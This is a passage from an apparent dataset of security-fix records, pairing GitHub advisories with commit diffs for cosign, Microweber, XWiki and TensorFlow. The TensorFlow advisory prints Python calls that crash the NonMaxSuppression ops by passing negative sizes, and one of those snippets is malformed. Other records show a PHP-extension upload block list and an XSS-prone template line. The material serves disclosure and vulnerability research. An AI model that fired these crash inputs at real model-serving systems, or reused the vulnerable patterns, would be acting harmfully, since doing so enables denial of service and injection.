regoValidationErrs...)\\n+\\t\\t\\t\\t\\tcontinue\\n \\t\\t\\t\\t}\\n \\t\\t\\t}\\n+\\n+\\t\\t\\tchecked = append(checked, vp)\\n \\t\\t}\\n \\n \\t\\tif len(validationErrors) > 0 {\\n@@ -237,10 +242,14 @@ func (c *VerifyAttestationCommand) Exec(ctx context.Context, images []string) (e\\n \\t\\t\\treturn fmt.Errorf(\"%d validation errors occurred\", len(validationErrors))\\n \\t\\t}\\n \\n+\\t\\tif len(checked) == 0 {\\n+\\t\\t\\treturn fmt.Errorf(\"none of the attestations matched the predicate type: %s\", c.PredicateType)\\n+\\t\\t}\\n+\\n \\t\\t\/\/ TODO: add CUE validation report to `PrintVerificationHeader`.\\n \\t\\tPrintVerificationHeader(imageRef, co, bundleVerified, fulcioVerified)\\n \\t\\t\/\/ The attestations are always JSON, so use the raw \"text\" mode for outputting them instead of conversion\\n-\\t\\tPrintVerification(imageRef, verified, \"text\")\\n+\\t\\tPrintVerification(imageRef, checked, \"text\")\\n \\t}\\n \\n \\treturn nil'}}","message_norm":"merge pull request from ghsa-vjxv-45g9-9296\n\ntoday the verification logic:\n1. verifies signatures on attestations (at least one must verify, or it errors),\n2. all attestations matching the specified `--type` must pass any specified cue\/rego policies,\n3. *all* signature-verified attestations are then printed.\n\nhowever, if none of the attestations match the specified `--type` then `2.` is considered satisfied and we proceed to `3.`\n\nthis changes the above logic to:\n1. same.\n2. same, but these are put into a `checked` list,\n3. `checked` must be non-empty (or an error is printed about no attestations matching `--type`),\n4. *just* the `checked` attestations are printed.\n\n---\n\nthe bug at head:\n```shell\n$ cosign verify-attestation --type spdx ghcr.io\/distroless\/static@sha256:dd7614b5a12bc4d617b223c588b4e0c833402b8f4991fb5702ea83afad1986e2\n\nverification for ghcr.io\/distroless\/static@sha256:dd7614b5a12bc4d617b223c588b4e0c833402b8f4991fb5702ea83afad1986e2 --\nthe following checks were performed on each of these signatures:\n  - the cosign claims were validated\n  - existence of the claims in the transparency log was verified offline\n  - any certificates were verified against the fulcio roots.\ncertificate subject:  https:\/\/github.com\/distroless\/static\/.github\/workflows\/release.yaml@refs\/heads\/main\ncertificate issuer url:  https:\/\/token.actions.githubusercontent.com\ncertificate extension github workflow trigger: schedule\ncertificate extension github workflow sha: 7e7572e578de7c51a2f1a1791f025cf315503aa2\ncertificate extension github workflow name: create release\ncertificate extension github workflow trigger distroless\/static\ncertificate extension github workflow ref: refs\/heads\/main\n{\"payloadtype\":\"application\/vnd.in-toto+json\",\"payload\":\"eyjfdhlwzsi6imh0dhbzoi8vaw4tdg90by5pby9tdgf0zw1lbnqvdjaumsisinbyzwrpy2f0zvr5cguioijjb3npz24uc2lnc3rvcmuuzgv2l2f0dgvzdgf0aw9ul3z1bg4vdjeilcjzdwjqzwn0ijpbeyjuyw1lijoiz2hjci5pby9kaxn0cm9szxnzl3n0yxrpyyisimrpz2vzdci6eyjzageyntyioijkzdc2mtrinwexmmjjngq2mtdimjizyzu4ogi0ztbjodmzndayyjhmndk5mwzintcwmmvhodnhzmfkmtk4nmuyin19xswichjlzgljyxrlijp7imludm9jyxrpb24ionsicgfyyw1ldgvycyi6bnvsbcwidxjpijoiahr0chm6ly9naxrodwiuy29tl2rpc3ryb2xlc3mvc3rhdgljl2fjdglvbnmvcnvucy8ynzc5mjeynza1iiwizxzlbnrfawqioiiynzc5mjeynza1iiwiynvpbgrlci5pzci6iknyzwf0zsbszwxlyxnlin0sinnjyw5uzxiionsidxjpijoiahr0chm6ly9naxrodwiuy29tl2fxdwfzzwn1cml0es90cml2esisinzlcnnpb24ioiiwlji5ljiilcjkyii6eyj1cmkioiiilcj2zxjzaw9uijoiin0sinjlc3vsdci6eyikc2nozw1hijoiahr0chm6ly9qc29ulnnjagvtyxn0b3jllm9yzy9zyxjpzi0yljeumc1ydg0uns5qc29uiiwicnvucyi6w3siy29sdw1us2luzci6inv0zje2q29kzvvuaxrziiwib3jpz2luywxvcmlcyxnlswrzijp7iljpt1rqqvriijp7invyasi6imzpbgu6ly8vin19lcjyzxn1bhrzijpbxswidg9vbci6eyjkcml2zxiionsiznvsbe5hbwuioijucml2esbwdwxuzxjhymlsaxr5ifnjyw5uzxiilcjpbmzvcm1hdglvblvyasi6imh0dhbzoi8vz2l0ahvilmnvbs9hcxvhc2vjdxjpdhkvdhjpdnkilcjuyw1lijoivhjpdnkilcjydwxlcyi6w10sinzlcnnpb24ioiiwlji5ljiifx19xswidmvyc2lvbii6ijiums4win19lcjtzxrhzgf0ysi6eyjzy2fuu3rhcnrlze9uijoimjaymi0woc0wmlqwmjozmzo0n1oilcjzy2furmluaxnozwrpbii6ijiwmjitmdgtmdjumdi6mzm6ntnain19fq==\",\"signatures\":[{\"keyid\":\"\",\"sig\":\"meyciqcovbtlobxyb2zpvhp3j6qzqltsh0\/rc7frinsapysqxaihaiklzu1fxukppoihennspmbob6xfzbrs5sdw1yfsch1a\"}]}\n```\n\nthe same with this change:\n```shell\n$ go run .\/cmd\/cosign verify-attestation --type spdx ghcr.io\/distroless\/static@sha256:dd7614b5a12bc4d617b223c588b4e0c833402b8f4991fb5702ea83afad1986e2\nerror: none of the attestations matched the predicate type: spdx\nmain.go:62: error during command execution: none of the attestations matched the predicate type: spdx\nexit status 1\n```\n\na valid `--type` with this change:\n```shell\n$ go run .\/cmd\/cosign verify-attestation --type vuln ghcr.io\/distroless\/static@sha256:dd7614b5a12bc4d617b223c588b4e0c833402b8f4991fb5702ea83afad1986e2\n\nverification for ghcr.io\/distroless\/static@sha256:dd7614b5a12bc4d617b223c588b4e0c833402b8f4991fb5702ea83afad1986e2 --\nthe following checks were performed on each of these signatures:\n  - the cosign claims were validated\n  - existence of the claims in the transparency log was verified offline\n  - any certificates were verified against the fulcio roots.\ncertificate subject:  https:\/\/github.com\/distroless\/static\/.github\/workflows\/release.yaml@refs\/heads\/main\ncertificate issuer url:  https:\/\/token.actions.githubusercontent.com\ncertificate extension github workflow trigger: schedule\ncertificate extension github workflow sha: 7e7572e578de7c51a2f1a1791f025cf315503aa2\ncertificate extension github workflow name: create release\ncertificate extension github workflow trigger distroless\/static\ncertificate extension github workflow ref: refs\/heads\/main\n{\"payloadtype\":\"application\/vnd.in-toto+json\",\"payload\":\"eyjfdhlwzsi6imh0dhbzoi8vaw4tdg90by5pby9tdgf0zw1lbnqvdjaumsisinbyzwrpy2f0zvr5cguioijjb3npz24uc2lnc3rvcmuuzgv2l2f0dgvzdgf0aw9ul3z1bg4vdjeilcjzdwjqzwn0ijpbeyjuyw1lijoiz2hjci5pby9kaxn0cm9szxnzl3n0yxrpyyisimrpz2vzdci6eyjzageyntyioijkzdc2mtrinwexmmjjngq2mtdimjizyzu4ogi0ztbjodmzndayyjhmndk5mwzintcwmmvhodnhzmfkmtk4nmuyin19xswichjlzgljyxrlijp7imludm9jyxrpb24ionsicgfyyw1ldgvycyi6bnvsbcwidxjpijoiahr0chm6ly9naxrodwiuy29tl2rpc3ryb2xlc3mvc3rhdgljl2fjdglvbnmvcnvucy8ynzc5mjeynza1iiwizxzlbnrfawqioiiynzc5mjeynza1iiwiynvpbgrlci5pzci6iknyzwf0zsbszwxlyxnlin0sinnjyw5uzxiionsidxjpijoiahr0chm6ly9naxrodwiuy29tl2fxdwfzzwn1cml0es90cml2esisinzlcnnpb24ioiiwlji5ljiilcjkyii6eyj1cmkioiiilcj2zxjzaw9uijoiin0sinjlc3vsdci6eyikc2nozw1hijoiahr0chm6ly9qc29ulnnjagvtyxn0b3jllm9yzy9zyxjpzi0yljeumc1ydg0uns5qc29uiiwicnvucyi6w3siy29sdw1us2luzci6inv0zje2q29kzvvuaxrziiwib3jpz2luywxvcmlcyxnlswrzijp7iljpt1rqqvriijp7invyasi6imzpbgu6ly8vin19lcjyzxn1bhrzijpbxswidg9vbci6eyjkcml2zxiionsiznvsbe5hbwuioijucml2esbwdwxuzxjhymlsaxr5ifnjyw5uzxiilcjpbmzvcm1hdglvblvyasi6imh0dhbzoi8vz2l0ahvilmnvbs9hcxvhc2vjdxjpdhkvdhjpdnkilcjuyw1lijoivhjpdnkilcjydwxlcyi6w10sinzlcnnpb24ioiiwlji5ljiifx19xswidmvyc2lvbii6ijiums4win19lcjtzxrhzgf0ysi6eyjzy2fuu3rhcnrlze9uijoimjaymi0woc0wmlqwmjozmzo0n1oilcjzy2furmluaxnozwrpbii6ijiwmjitmdgtmdjumdi6mzm6ntnain19fq==\",\"signatures\":[{\"keyid\":\"\",\"sig\":\"meyciqcovbtlobxyb2zpvhp3j6qzqltsh0\/rc7frinsapysqxaihaiklzu1fxukppoihennspmbob6xfzbrs5sdw1yfsch1a\"}]}\n```\n\nsigned-off-by: matt moore <mattmoor@chainguard.dev>","language":"en","entities":"[('ghsa-vjxv-45g9-9296', 'VULNID', 'GHSA'), ('verifies', 'ACTION', ''), ('verify', 'ACTION', ''), ('signature', 'SECWORD', ''), ('verified', 'ACTION', ''), ('changes', 'ACTION', ''), ('error', 'FLAW', ''), ('bug', 'FLAW', ''), ('validated', 'ACTION', ''), ('verified', 'ACTION', ''), ('verified', 'ACTION', ''), ('certificate', 'SECWORD', ''), ('https:\/\/github.com\/distroless\/static\/.github\/workflows\/release.yaml@refs\/heads\/main', 'URL', ''), ('certificate', 'SECWORD', ''), ('https:\/\/token.actions.githubusercontent.com', 'URL', ''), ('certificate', 'SECWORD', ''), ('certificate', 'SECWORD', ''), ('sha: 7e7572e578de7c51a2f1a1791f025cf315503aa2', 'SHA', 'prefix_colon_sha'), ('certificate', 'SECWORD', ''), ('certificate', 'SECWORD', ''), ('certificate', 'SECWORD', ''), ('toto+json\",\"payload\":\"eyjfdhlwzsi6imh0dhbzoi8vaw4tdg90by5pby9tdgf0zw1lbnqvdjaumsisinbyzwrpy2f0zvr5cguioijjb3npz24uc2lnc3rvcmuuzgv2l2f0dgvzdgf0aw9ul3z1bg4vdjeilcjzdwjqzwn0ijpbeyjuyw1lijoiz2hjci5pby9kaxn0cm9szxnzl3n0yxrpyyisimrpz2vzdci6eyjzageyntyioijkzdc2mtrinwexmmjjngq2mtdimjizyzu4ogi0ztbjodmzndayyjhmndk5mwzintcwmmvhodnhzmfkmtk4nmuyin19xswichjlzgljyxrlijp7imludm9jyxrpb24ionsicgfyyw1ldgvycyi6bnvsbcwidxjpijoiahr0chm6ly9naxrodwiuy29tl2rpc3ryb2xlc3mvc3rhdgljl2fjdglvbnmvcnvucy8ynzc5mjeynza1iiwizxzlbnrfawqioiiynzc5mjeynza1iiwiynvpbgrlci5pzci6iknyzwf0zsbszwxlyxnlin0sinnjyw5uzxiionsidxjpijoiahr0chm6ly9naxrodwiuy29tl2fxdwfzzwn1cml0es90cml2esisinzlcnnpb24ioiiwlji5ljiilcjkyii6eyj1cmkioiiilcj2zxjzaw9uijoiin0sinjlc3vsdci6eyikc2nozw1hijoiahr0chm6ly9qc29ulnnjagvtyxn0b3jllm9yzy9zyxjpzi0yljeumc1ydg0uns5qc29uiiwicnvucyi6w3siy29sdw1us2luzci6inv0zje2q29kzvvuaxrziiwib3jpz2luywxvcmlcyxnlswrzijp7iljpt1rqqvriijp7invyasi6imzpbgu6ly8vin19lcjyzxn1bhrzijpbxswidg9vbci6eyjkcml2zxiionsiznvsbe5hbwuioijucml2esbwdwxuzxjhymlsaxr5ifnjyw5uzxiilcjpbmzvcm1hdglvblvyasi6imh0dhbzoi8vz2l0ahvilmnvbs9hcxvhc2vjdxjpdhkvdhjpdnkilcjuyw1lijoivhjpdnkilcjydwxlcyi6w10sinzlcnnpb24ioiiwlji5ljiifx19xswidmvyc2lvbii6ijiums4win19lcjtzxrhzgf0ysi6eyjzy2fuu3rhcnrlze9uijoimjaymi0woc0wmlqwmjozmzo0n1oilcjzy2furmluaxnozwrpbii6ijiwmjitmdgtmdjumdi6mzm6ntnain19fq==\",\"signatures\":[{\"keyid\":\"\",\"sig\":\"meyciqcovbtlobxyb2zpvhp3j6qzqltsh0', 'SECWORD', ''), ('error', 'FLAW', ''), ('error', 'FLAW', ''), ('command execution', 'SECWORD', ''), ('validated', 'ACTION', ''), ('verified', 'ACTION', ''), ('verified', 'ACTION', ''), ('certificate', 'SECWORD', ''), ('https:\/\/github.com\/distroless\/static\/.github\/workflows\/release.yaml@refs\/heads\/main', 'URL', ''), ('certificate', 'SECWORD', ''), ('https:\/\/token.actions.githubusercontent.com', 'URL', ''), ('certificate', 'SECWORD', ''), ('certificate', 'SECWORD', ''), ('sha: 7e7572e578de7c51a2f1a1791f025cf315503aa2', 'SHA', 'prefix_colon_sha'), ('certificate', 'SECWORD', ''), ('certificate', 'SECWORD', ''), ('certificate', 'SECWORD', ''), ('toto+json\",\"payload\":\"eyjfdhlwzsi6imh0dhbzoi8vaw4tdg90by5pby9tdgf0zw1lbnqvdjaumsisinbyzwrpy2f0zvr5cguioijjb3npz24uc2lnc3rvcmuuzgv2l2f0dgvzdgf0aw9ul3z1bg4vdjeilcjzdwjqzwn0ijpbeyjuyw1lijoiz2hjci5pby9kaxn0cm9szxnzl3n0yxrpyyisimrpz2vzdci6eyjzageyntyioijkzdc2mtrinwexmmjjngq2mtdimjizyzu4ogi0ztbjodmzndayyjhmndk5mwzintcwmmvhodnhzmfkmtk4nmuyin19xswichjlzgljyxrlijp7imludm9jyxrpb24ionsicgfyyw1ldgvycyi6bnvsbcwidxjpijoiahr0chm6ly9naxrodwiuy29tl2rpc3ryb2xlc3mvc3rhdgljl2fjdglvbnmvcnvucy8ynzc5mjeynza1iiwizxzlbnrfawqioiiynzc5mjeynza1iiwiynvpbgrlci5pzci6iknyzwf0zsbszwxlyxnlin0sinnjyw5uzxiionsidxjpijoiahr0chm6ly9naxrodwiuy29tl2fxdwfzzwn1cml0es90cml2esisinzlcnnpb24ioiiwlji5ljiilcjkyii6eyj1cmkioiiilcj2zxjzaw9uijoiin0sinjlc3vsdci6eyikc2nozw1hijoiahr0chm6ly9qc29ulnnjagvtyxn0b3jllm9yzy9zyxjpzi0yljeumc1ydg0uns5qc29uiiwicnvucyi6w3siy29sdw1us2luzci6inv0zje2q29kzvvuaxrziiwib3jpz2luywxvcmlcyxnlswrzijp7iljpt1rqqvriijp7invyasi6imzpbgu6ly8vin19lcjyzxn1bhrzijpbxswidg9vbci6eyjkcml2zxiionsiznvsbe5hbwuioijucml2esbwdwxuzxjhymlsaxr5ifnjyw5uzxiilcjpbmzvcm1hdglvblvyasi6imh0dhbzoi8vz2l0ahvilmnvbs9hcxvhc2vjdxjpdhkvdhjpdnkilcjuyw1lijoivhjpdnkilcjydwxlcyi6w10sinzlcnnpb24ioiiwlji5ljiifx19xswidmvyc2lvbii6ijiums4win19lcjtzxrhzgf0ysi6eyjzy2fuu3rhcnrlze9uijoimjaymi0woc0wmlqwmjozmzo0n1oilcjzy2furmluaxnozwrpbii6ijiwmjitmdgtmdjumdi6mzm6ntnain19fq==\",\"signatures\":[{\"keyid\":\"\",\"sig\":\"meyciqcovbtlobxyb2zpvhp3j6qzqltsh0', 'SECWORD', ''), ('mattmoor@chainguard.dev', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['cmd\/cosign\/cli\/verify\/verify_attestation.go'])","num_files":1.0},{"index":3138,"vuln_id":"GHSA-vm37-j55j-8655","cwe_id":"{'CWE-78'}","score":7.8,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/0a7e5f1d81de884861ca677ee1aaac31f188d632'}","dataset":"osv","summary":"OS Command Injection in Microweber Microweber is a content management system with drag and drop. Prior to version 1.2.11, Microweber is vulnerable to OS Command Injection.","published_date":"2022-02-12","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/0a7e5f1d81de884861ca677ee1aaac31f188d632","commit_sha":"0a7e5f1d81de884861ca677ee1aaac31f188d632","patch":"SINGLE","chain_ord":"['0a7e5f1d81de884861ca677ee1aaac31f188d632']","before_first_fix_commit":"{'b66537fbd7792d10f07fa7870ead7aae293f1120'}","last_fix_commit":"0a7e5f1d81de884861ca677ee1aaac31f188d632","chain_ord_pos":1.0,"commit_datetime":"02\/10\/2022, 08:27:09","message":"Update plupload.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 1, 'deletions': 2, 'total': 3}","files":"{'src\/MicroweberPackages\/App\/functions\/plupload.php': {'additions': 1, 'deletions': 2, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/0a7e5f1d81de884861ca677ee1aaac31f188d632\/src%2FMicroweberPackages%2FApp%2Ffunctions%2Fplupload.php', 'patch': \"@@ -149,14 +149,13 @@\\n                             $is_ext = strtolower($is_ext);\\n \\n                             switch ($is_ext) {\\n-                                case 'php':\\n+                                case 'php': \\n                                 case 'php12':\\n                                 case 'php11':\\n                                 case 'php10':\\n                                 case 'php9':\\n                                 case 'php8':\\n                                 case 'php7':\\n-                                case 'php6':\\n                                 case 'php5':\\n                                 case 'php4':\\n                                 case 'php3':\"}}","message_norm":"update plupload.php","language":"ro","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/App\/functions\/plupload.php'])","num_files":1.0},{"index":3144,"vuln_id":"GHSA-vmhh-xh3g-j992","cwe_id":"{'CWE-80', 'CWE-79', 'CWE-116'}","score":7.4,"chain":"{'https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/bd935320bee3c27cf7548351b1d0f935f116d437'}","dataset":"osv","summary":"Cross-site Scripting in the Flamingo theme manager ### Impact\nWe found a possible XSS vector in the `FlamingoThemesCode.WebHomeSheet` wiki page related to the \"newThemeName\" form field.\n\n### Patches\n\nThe issue is patched in versions 12.10.11, 14.0-rc-1, 13.4.7, 13.10.3.\n\n### Workarounds\nThe easiest workaround is to edit the wiki page `FlamingoThemesCode.WebHomeSheet` (with wiki editor) and change the line\n\n```\n<input type=\"hidden\" name=\"newThemeName\" id=\"newThemeName\" value=\"$request.newThemeName\" \/>\n```\n\ninto\n\n```\n<input type=\"hidden\" name=\"newThemeName\" id=\"newThemeName\" value=\"$escapetool.xml($request.newThemeName)\" \/>\n```\n\n### References\n  * https:\/\/jira.xwiki.org\/browse\/XWIKI-19294\n  * https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/bd935320bee3c27cf7548351b1d0f935f116d437\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Jira XWiki](https:\/\/jira.xwiki.org)\n* Email us at [security mailing list](mailto:security@xwiki.org)","published_date":"2022-05-25","chain_len":1,"project":"https:\/\/github.com\/xwiki\/xwiki-platform","commit_href":"https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/bd935320bee3c27cf7548351b1d0f935f116d437","commit_sha":"bd935320bee3c27cf7548351b1d0f935f116d437","patch":"SINGLE","chain_ord":"['bd935320bee3c27cf7548351b1d0f935f116d437']","before_first_fix_commit":"{'21906acb5ee2304552f56f9bbdbf8e7d368f7f3a'}","last_fix_commit":"bd935320bee3c27cf7548351b1d0f935f116d437","chain_ord_pos":1.0,"commit_datetime":"01\/04\/2022, 10:34:49","message":"XWIKI-19294: Fix bad escaping","author":"Thomas Mortagne","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'xwiki-platform-core\/xwiki-platform-flamingo\/xwiki-platform-flamingo-theme\/xwiki-platform-flamingo-theme-ui\/src\/main\/resources\/FlamingoThemesCode\/WebHomeSheet.xml': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/xwiki\/xwiki-platform\/raw\/bd935320bee3c27cf7548351b1d0f935f116d437\/xwiki-platform-core%2Fxwiki-platform-flamingo%2Fxwiki-platform-flamingo-theme%2Fxwiki-platform-flamingo-theme-ui%2Fsrc%2Fmain%2Fresources%2FFlamingoThemesCode%2FWebHomeSheet.xml', 'patch': '@@ -287,7 +287,7 @@\\n       &lt;form action=\"$doc.getURL()\" method=\"post\"&gt;\\n         &lt;input type=\"hidden\" name=\"form_token\" value=\"$services.csrf.token\" \/&gt;\\n         &lt;input type=\"hidden\" name=\"action\" value=\"create\"\/&gt;\\n-        &lt;input type=\"hidden\" name=\"newThemeName\" id=\"newThemeName\" value=\"$request.newThemeName\" \/&gt;\\n+        &lt;input type=\"hidden\" name=\"newThemeName\" id=\"newThemeName\" value=\"$escapetool.xml($request.newThemeName)\" \/&gt;\\n         &lt;input type=\"submit\" value=\"$services.localization.render(\\'platform.flamingo.themes.home.create.confirm\\')\" class=\"button\"\/&gt;\\n       &lt;\/form&gt;\\n     {{\/html}}'}}","message_norm":"xwiki-19294: fix bad escaping","language":"ca","entities":"[('fix', 'ACTION', ''), ('escaping', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['xwiki-platform-core\/xwiki-platform-flamingo\/xwiki-platform-flamingo-theme\/xwiki-platform-flamingo-theme-ui\/src\/main\/resources\/FlamingoThemesCode\/WebHomeSheet.xml'])","num_files":1.0},{"index":3146,"vuln_id":"GHSA-vmjw-c2vp-p33c","cwe_id":"{'CWE-681'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d'}","dataset":"osv","summary":"Crash in NMS ops caused by integer conversion to unsigned ### Impact\nAn attacker can cause denial of service in applications serving models using `tf.raw_ops.NonMaxSuppressionV5` by triggering a division by 0:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],\n  scores=[1.0,2.0,3.0],\n  max_output_size=-1,\n  iou_threshold=0.5,\n  score_threshold=0.5,\n  soft_nms_sigma=1.0,\n  pad_to_max_output_size=True)\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/kernels\/image\/non_max_suppression_op.cc#L170-L271) uses a user controlled argument to resize a `std::vector`:\n\n```cc\n  const int output_size = max_output_size.scalar<int>()();\n  \/\/ ...\n  std::vector<int> selected;\n  \/\/ ...\n  if (pad_to_max_output_size) {\n    selected.resize(output_size, 0);\n    \/\/ ...\n  }\n```\n    \nHowever, as `std::vector::resize` takes the size argument as a `size_t` and `output_size` is an `int`, there is an implicit conversion to usigned. If the attacker supplies a negative value, this conversion results in a crash.\n\nA similar issue occurs in `CombinedNonMaxSuppression`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]]]],\n  scores=[[[1.0,2.0,3.0],[1.0,2.0,3.0],[1.0,2.0,3.0]]],\n  max_output_size_per_class=-1,\n  max_total_size=10,\n  iou_threshold=score_threshold=0.5,\n  pad_per_class=True,\n  clip_boxes=True)\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d) and commit [b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58","commit_sha":"b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58","patch":"MULTI","chain_ord":"['b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58', '3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d']","before_first_fix_commit":"{'a87fa31dc3becc97c7e945b9b8c8711acb92fc12'}","last_fix_commit":"3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d","chain_ord_pos":1.0,"commit_datetime":"07\/30\/2021, 05:24:52","message":"Prevent overflow due to integer conversion to unsigned.\n\nPiperOrigin-RevId: 387738045\nChange-Id: Id7e95bc07e02df1c66b72bd09f389608c87bdebe","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/core\/kernels\/image\/non_max_suppression_op.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58\/tensorflow%2Fcore%2Fkernels%2Fimage%2Fnon_max_suppression_op.cc', 'patch': '@@ -930,6 +930,8 @@ class CombinedNonMaxSuppressionOp : public OpKernel {\\n         errors::InvalidArgument(\"max_size_per_class must be 0-D, got shape \",\\n                                 max_output_size.shape().DebugString()));\\n     const int max_size_per_class = max_output_size.scalar<int>()();\\n+    OP_REQUIRES(context, max_size_per_class > 0,\\n+                errors::InvalidArgument(\"max_size_per_class must be positive\"));\\n     \/\/ max_total_size: scalar\\n     const Tensor& max_total_size = context->input(3);\\n     OP_REQUIRES('}}","message_norm":"prevent overflow due to integer conversion to unsigned.\n\npiperorigin-revid: 387738045\nchange-id: id7e95bc07e02df1c66b72bd09f389608c87bdebe","language":"en","entities":"[('prevent', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('387738045', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/image\/non_max_suppression_op.cc'])","num_files":1.0},{"index":3147,"vuln_id":"GHSA-vmjw-c2vp-p33c","cwe_id":"{'CWE-681'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d'}","dataset":"osv","summary":"Crash in NMS ops caused by integer conversion to unsigned ### Impact\nAn attacker can cause denial of service in applications serving models using `tf.raw_ops.NonMaxSuppressionV5` by triggering a division by 0:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],\n  scores=[1.0,2.0,3.0],\n  max_output_size=-1,\n  iou_threshold=0.5,\n  score_threshold=0.5,\n  soft_nms_sigma=1.0,\n  pad_to_max_output_size=True)\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/kernels\/image\/non_max_suppression_op.cc#L170-L271) uses a user controlled argument to resize a `std::vector`:\n\n```cc\n  const int output_size = max_output_size.scalar<int>()();\n  \/\/ ...\n  std::vector<int> selected;\n  \/\/ ...\n  if (pad_to_max_output_size) {\n    selected.resize(output_size, 0);\n    \/\/ ...\n  }\n```\n    \nHowever, as `std::vector::resize` takes the size argument as a `size_t` and `output_size` is an `int`, there is an implicit conversion to usigned. If the attacker supplies a negative value, this conversion results in a crash.\n\nA similar issue occurs in `CombinedNonMaxSuppression`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]]]],\n  scores=[[[1.0,2.0,3.0],[1.0,2.0,3.0],[1.0,2.0,3.0]]],\n  max_output_size_per_class=-1,\n  max_total_size=10,\n  iou_threshold=score_threshold=0.5,\n  pad_per_class=True,\n  clip_boxes=True)\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d) and commit [b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 